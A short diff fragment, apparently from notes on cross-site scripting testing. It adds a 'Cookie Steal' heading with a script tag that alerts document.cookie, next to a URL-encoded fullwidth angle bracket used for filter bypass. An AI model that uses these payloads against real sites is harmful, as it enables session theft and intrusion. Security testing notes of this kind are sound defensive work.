@@ -80,6 +80,10 @@ o	Comment boxes , search bar’s etc..
  > ➔ %EF%BC%9E
 
 
+#Cookie Steal
+<script>alert(document.cookie)</script>
+
+
 
 
                                                                                                 Blind XSS Testing
